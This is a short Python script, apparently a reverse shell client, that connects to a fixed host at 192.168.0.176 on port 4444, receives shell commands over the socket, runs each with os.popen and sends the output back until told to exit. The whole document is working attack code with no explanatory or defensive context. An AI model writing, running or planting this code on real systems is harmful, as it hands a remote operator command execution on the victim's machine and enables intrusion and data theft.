import socket
import os

SERVER_HOST = "192.168.0.176"
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = os.popen(command).read()
    s.send(output.encode())

s.close()
